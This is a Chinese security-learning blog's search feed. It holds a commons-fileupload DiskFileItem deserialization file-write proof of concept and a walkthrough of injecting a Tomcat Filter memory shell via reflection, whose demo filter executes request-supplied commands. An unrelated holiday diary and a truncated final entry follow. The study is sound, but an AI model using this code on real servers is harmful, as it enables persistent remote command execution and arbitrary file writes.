<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>FileUpload1</title>
    <link href="/2022/04/13/FileUpload1/"/>
    <url>/2022/04/13/FileUpload1/</url>
    
    <content type="html"><![CDATA[<h1 id="FileUpload1"><a href="#FileUpload1" class="headerlink" title="FileUpload1"></a>FileUpload1</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-fileupload<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-fileupload<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">DiskFileItem.readObject()<br>    DiskFileItem.getOutputStream()<br>            DeferredFileOutputStream.write()<br></code></pre></td></tr></table></figure><h2 id="DiskFileItem-readObject"><a href="#DiskFileItem-readObject" class="headerlink" title="DiskFileItem#readObject"></a>DiskFileItem#readObject</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000971.png" alt="QQ截图20220412225050"></p><h3 id="this-getOutputStream"><a href="#this-getOutputStream" class="headerlink" title="this.getOutputStream"></a>this.getOutputStream</h3><p>跟进看一下。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122341990.png" alt="QQ截图20220412225416"></p><p>dfos是一个它的对象。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000114.png" alt="QQ截图20220412225805"></p><p>如果dfos为空。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000551.png" alt="QQ截图20220412230051"><br>那么文件路径使用 tempFile，如果tempFile为空就使用repository代替tempFile（这里就可以指定文件路径写入！）。如果还为空，则使用 <code>System.getProperty(&quot;java.io.tmpdir&quot;)</code>，文件名使用 <code>format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId())</code> 生成随机的文件名。</p><p>接着就是判断。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.cachedContent != <span class="hljs-literal">null</span>) &#123;<br>            output.write(<span class="hljs-built_in">this</span>.cachedContent);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-built_in">this</span>.dfosFile);<br>            IOUtils.copy(input, output);<br>            <span class="hljs-built_in">this</span>.dfosFile.delete();<br>            <span class="hljs-built_in">this</span>.dfosFile = <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        output.close();<br>        <span class="hljs-built_in">this</span>.cachedContent = <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>如果cachedContent不为空，则直接写入。</p><h2 id="DiskFileItem-writeObject"><a href="#DiskFileItem-writeObject" class="headerlink" title="DiskFileItem#writeObject"></a>DiskFileItem#writeObject</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122341882.png" alt="QQ截图20220412233859"></p><p>这里判断就是通过 <code>dfos.isInMemory()</code> 方法判断文件内容是否是在内存中，其实也就是通过判断 written 的长度和 threshold 阈值长度大小，如果写入大于阈值，则会被写出到文件中，那就不是存在内存中了。</p><ul><li>如果在内存中，则会调用 <code>dfos.getData()</code> 方法获取存在 dfos 成员变量 memoryOutputStream 的 ByteArrayOutputStream 对象放在 cachedContent 中。</li><li>如果不在内存中，则会将 cachedContent 置为空，然后将 dfosFile 赋值为 dfos 的成员变量 outputFile 对象。</li></ul><p>由于 dfos 是 transient 修饰的，不能被反序列化，所以能被反序列化的有 byte 数组类型的 cachedContent 和 File 对象的 dfosFile。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItem;<br><span class="hljs-keyword">import</span> org.apache.commons.io.output.DeferredFileOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUpload1</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <br>        <span class="hljs-type">String</span> <span class="hljs-variable">charset</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UTF-8&quot;</span>;<br>        <span class="hljs-type">byte</span>[] bytes   = <span class="hljs-string">&quot;xsw6a&quot;</span>.getBytes(charset);<br>        <br><span class="hljs-type">File</span>   <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;F:\\FileUpload1&quot;</span>);<br>        <br>        <span class="hljs-type">DeferredFileOutputStream</span> <span class="hljs-variable">dfos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeferredFileOutputStream</span>(<span class="hljs-number">0</span>, repository);<br>        <br>        <span class="hljs-type">DiskFileItem</span> <span class="hljs-variable">diskFileItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItem</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, repository);<br><br><span class="hljs-comment">//         序列化时 writeObject 要求 dfos 不能为 null</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dfosFile</span> <span class="hljs-operator">=</span> DiskFileItem.class.getDeclaredField(<span class="hljs-string">&quot;dfos&quot;</span>);<br>        dfosFile.setAccessible(<span class="hljs-literal">true</span>);<br>        dfosFile.set(diskFileItem, dfos);<br>        <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field2</span> <span class="hljs-operator">=</span> DiskFileItem.class.getDeclaredField(<span class="hljs-string">&quot;cachedContent&quot;</span>);<br>        field2.setAccessible(<span class="hljs-literal">true</span>);<br>        field2.set(diskFileItem, bytes);<br><br>        serialize(diskFileItem);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p> 序列化时 writeObject 要求 dfos 不能为 null？为什么？难道不能通过反射直接设置outputFile的值为dfos吗？</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122352647.png" alt="QQ截图20220412235227"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000292.png" alt="QQ截图20220412235233"></p><p>可以是可以，但是不能序列化<strong>。因为没有继承Serializable！！</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000266.png" alt="QQ截图20220412235700"></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204130000900.png" alt="QQ截图20220412235918"></p>]]></content>
    
    
    <categories>
      
      <category>FileUpload</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存马：Filter型--第二天</title>
    <link href="/2022/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AFilter%E5%9E%8B-%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <url>/2022/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AFilter%E5%9E%8B-%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-内存马：Filter型–第二天"><a href="#Tomcat-内存马：Filter型–第二天" class="headerlink" title="Tomcat 内存马：Filter型–第二天"></a>Tomcat 内存马：Filter型–第二天</h1><p><a href="https://xz.aliyun.com/t/10888">https://xz.aliyun.com/t/10888</a></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTwo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        Filter.<span class="hljs-built_in">super</span>.init(filterConfig);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        servletRequest.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        servletResponse.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>); <span class="hljs-comment">//编码解码</span><br>        filterChain.doFilter(servletRequest,servletResponse);<br>        System.out.println(servletRequest.getParameter(<span class="hljs-string">&quot;xs&quot;</span>));<br>        Runtime.getRuntime().exec(servletRequest.getParameter(<span class="hljs-string">&quot;xs&quot;</span>));<br>        System.out.println(<span class="hljs-string">&quot;开始过滤&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        Filter.<span class="hljs-built_in">super</span>.destroy();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里主要探索一下到底哪里执行了doFilter，所以直接就在doFilter中写了命令执行，实际情况不可能出现这种情况。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>在doFilter下好断点。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048403.png" alt="QQ截图20220412104631"></p><p>跟进会来到这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048289.png" alt="QQ截图20220412104720"></p><p>继续跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048358.png" alt="QQ截图20220412105223">会来到这里触发doFilter，但是这里并不是我们设置的Filter（首先会通过系统自带的）。但是会经过数组会调用到我们设置的TestTwo–Fliter。最后接受xs的值，弹出计算器。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048858.png" alt="QQ截图20220412112403"></p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ApplicationFilterChain<span class="hljs-meta">#doFilter</span><br>ApplicationFilterChain<span class="hljs-meta">#internalDoFilter \\通过数组的形式让其经过自己的过滤器</span><br></code></pre></td></tr></table></figure><h2 id="StandardWrapperValve-invoke"><a href="#StandardWrapperValve-invoke" class="headerlink" title="StandardWrapperValve#invoke"></a>StandardWrapperValve#invoke</h2><p>根据调用链。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048831.png" alt="QQ截图20220412112703"></p><p>可以看到这里创建了<code>filterChain</code><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048740.png" alt="QQ截图20220412112816"></p><p>并且这里的值已经变成了我们创建的Filter，所以我们应该进入到ApplicationFilterFactory中查看。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048341.png" alt="QQ截图20220412113942"></p><p>可以看到在这里获取到了过滤器的一些相关东西。</p><p>而这个context是从另一个类创建而来的，而这个类我们恰好又是可以利用反射来创建对象的。继续调试。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048933.png" alt="QQ截图20220412114817"></p><p>来到这里，这里是将filterConfig添加到filterChian中。这里的filterConfig是可以控制的，也就是说可以在filterChain调用addFilter时，将filter添加进去。这里的filterConfig都是由context中得到的。所以只要控制context，就可以触发漏洞。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade">FilterDefs：存放 FilterDef 的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例<br>等基本信息<br>FilterConfigs：存放 filterConfig 的数组，在 FilterConfig 中主要存放 FilterDef 和<br><span class="hljs-built_in">Filter</span> 对象等信息<br>FilterMaps：存放 FilterMap 的数组，在 FilterMap 中主要存放了 FilterName 和 对<br>应的 URLPattern<br><br>只要我们将<span class="hljs-built_in">filter</span> ，FilterDefs，FilterMaps添加到FilterConfigs中就可以添加<span class="hljs-built_in">filter</span>了<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ServletContext：<br>javax.servlet.ServletContextServlet规范中规定了的一个ServletContext接口，提供了Web应用所有Servlet的视图，通过它可以对某个Web应用的各种资源和功能进行访问。WEB容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext，它代表当前Web应用。并且它被所有客户端共享。 <br><br>ApplicationContext：<br>org.apache.catalina.core.ApplicationContext<br>对应Tomcat容器，为了满足Servlet规范，必须包含一个ServletContext接口的实现。Tomcat的Context容器中都会包含一个ApplicationContext。<br><br>StandardContext：<br>Catalina主要包括Connector和Container，StandardContext就是一个Container，它主要负责对进入的用户请求进行处理。实际来说，不是由它来进行处理，而是交给内部的valve处理。<br>一个context表示了一个外部应用，它包含多个<span class="hljs-keyword">wrapper</span>，每个<span class="hljs-keyword">wrapper</span>表示一个servlet定义。（Tomcat 默认的 Service 服务是 Catalina）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048583.png"></p><p>这样算是一个完整的流程算是弄懂了。</p><h2 id="获取StandardContext"><a href="#获取StandardContext" class="headerlink" title="获取StandardContext"></a>获取StandardContext</h2><p>这里因为刚入门就知识了解最简单的，也是网上最常见的。（前提是可以获取到request对象得时候）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.servlet.<span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <span class="hljs-comment">// 获取属性</span><br>appctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);  <span class="hljs-comment">//从servletContext中获取context属性-&gt;applicationContext</span><br><br><span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <span class="hljs-comment">// 获取属性</span><br>stdctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);  <span class="hljs-comment">// 从applicationContext中获取context属性-&gt;standardContext，applicationContext构造时需要传入standardContext</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048703.png" alt="QQ截图20220412194236"></p><h2 id="获取filterConfigs属性"><a href="#获取filterConfigs属性" class="headerlink" title="获取filterConfigs属性"></a>获取filterConfigs属性</h2><p><strong>filterConfigs:存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>   Configs.setAccessible(<span class="hljs-literal">true</span>);<br>   <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br></code></pre></td></tr></table></figure><h2 id="获取FilterDef"><a href="#获取FilterDef" class="headerlink" title="获取FilterDef"></a>获取FilterDef</h2><p><strong>filterRefs：filterRef的数组 FilterDef的作用主要为描述filter的字符串名称与Filter实例的关系</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">      <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>      filterDef.setFilter(filter);<br>      filterDef.setFilterName(name);<br>      filterDef.setFilterClass(filter.getClass().getName());<br>standardContext.addFilterDef(filterDef); \\将filterDef添加到filterDefs<br></code></pre></td></tr></table></figure><h2 id="获取FilterMaps"><a href="#获取FilterMaps" class="headerlink" title="获取FilterMaps"></a>获取FilterMaps</h2><p><strong>filterMaps：filterMap的数组(FilterMap中存放了所有filter相关的信息包括filterName和urlPattern。有了这些之后，使用matchFiltersURL函数将每个filter和当前URL进行匹配，匹配成功的通过) filterConfig我们看过，这里注意，filterConfig.filterRef实际和context.filterRef指向的地址一样，也就是同一个东西</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">FilterMap filterMap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FilterMap()</span>;<br>    filterMap.add<span class="hljs-constructor">URLPattern(<span class="hljs-string">&quot;/*&quot;</span>)</span>;<br>    filterMap.set<span class="hljs-constructor">FilterName(<span class="hljs-params">name</span>)</span>;<br>    filterMap.set<span class="hljs-constructor">Dispatcher(DispatcherType.REQUEST.<span class="hljs-params">name</span>()</span>);<br><br>    standardContext.add<span class="hljs-constructor">FilterMapBefore(<span class="hljs-params">filterMap</span>)</span>; \\是该过滤器为第一个<br></code></pre></td></tr></table></figure><h2 id="实例化ApplicationFilterConfig"><a href="#实例化ApplicationFilterConfig" class="headerlink" title="实例化ApplicationFilterConfig"></a>实例化ApplicationFilterConfig</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">constructor</span> = <span class="hljs-title">ApplicationFilterConfig</span>.<span class="hljs-title">class</span>.<span class="hljs-title">getDeclaredConstructor</span><span class="hljs-params">(Context.<span class="hljs-keyword">class</span>,FilterDef.<span class="hljs-keyword">class</span>)</span>;</span><br>      <span class="hljs-keyword">constructor</span>.setAccessible(true);<br>      ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) <span class="hljs-keyword">constructor</span>.newInstance(standardContext,filterDef); \\传入参数<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048981.png" alt="QQ截图20220412204429"></p><h2 id="传入FilterConfigs中"><a href="#传入FilterConfigs中" class="headerlink" title="传入FilterConfigs中"></a>传入FilterConfigs中</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">filterConfigs.put(name,filterConfig);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内存马</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3天的清明</title>
    <link href="/2022/04/11/3%E5%A4%A9%E7%9A%84%E6%B8%85%E6%98%8E/"/>
    <url>/2022/04/11/3%E5%A4%A9%E7%9A%84%E6%B8%85%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<h1 id="清明"><a href="#清明" class="headerlink" title="清明"></a>清明</h1><p>时间过去有一段时间了，今天来记录一下。只能根据图片回忆起零零散散的东西了。</p><h2 id="九眼桥"><a href="#九眼桥" class="headerlink" title="九眼桥"></a>九眼桥</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112312105.jpg" alt="8d35bc8f59a0eed98beed0fbdbad4ac"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112311232.jpg" alt="165f4447a635c6d21167ed6ad83c154"></p><h2 id="花花"><a href="#花花" class="headerlink" title="花花"></a>花花</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112312766.jpg" alt="e6913bd39789b6071fe6d7f3a5c1e36"></p><p>这一张一眼看过去真的好像是薰衣草，不过尽然不是。<del>.</del><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112313370.jpg" alt="3d197c4ae60046e6aa86aef544593c6"></p><h2 id="实验室"><a href="#实验室" class="headerlink" title="实验室"></a>实验室</h2><p>第一次坐在实验室学习了会。奈何有的人睡的流口水emmmm…..<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112314010.jpg" alt="3ec9a42f3a7d89d60e97d93ffc96b63"></p><h2 id="小手呀"><a href="#小手呀" class="headerlink" title="小手呀"></a>小手呀</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112314647.jpg" alt="a9f18ef1a94d5c1d1a84f14e19ee437"></p><h2 id="冒雨晚餐"><a href="#冒雨晚餐" class="headerlink" title="冒雨晚餐"></a>冒雨晚餐</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112315296.jpg" alt="bc58b06ad3d4439673e346f88113c61"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112315209.jpg" alt="cf7c44c00562b8cb147fdacb185587f"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112316245.jpg" alt="232c835a2ca22061f6dd49cd9cd2090"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112315231.jpg" alt="8303ed8e045952ad1c3aca34e85044a"></p><p>店员都说了分量足够哟，建议2-3份菜，把我吃的好撑~又不忍心浪费。</p><h2 id="烤肉"><a href="#烤肉" class="headerlink" title="烤肉"></a>烤肉</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112317852.jpg" alt="c3b4d23fa9b98c05b67e29393a21078"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112317914.jpg" alt="46d1324af7d24c921803b65b2c33d00"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉好像每次出去吃的都好像差不多（可以去玩点好玩的，不是上海某些人来四川，让峨眉山变成高风险，我们就没去成。），我觉得我们应该尝试新鲜吃的。还有些吃的地方没有拍照(自助)，三文鱼配芥末，看别人抖音上吃芥末+三文鱼吃的很香，我吃就好辣好难吃。这也是我们第一次三天都在一起。也不知道后面要什么时候才有空呢？希望疫情快快的离去…….</p>]]></content>
    
    
    <categories>
      
      <category>学生时代的恋爱</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爱情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat内存马：Filter型</title>
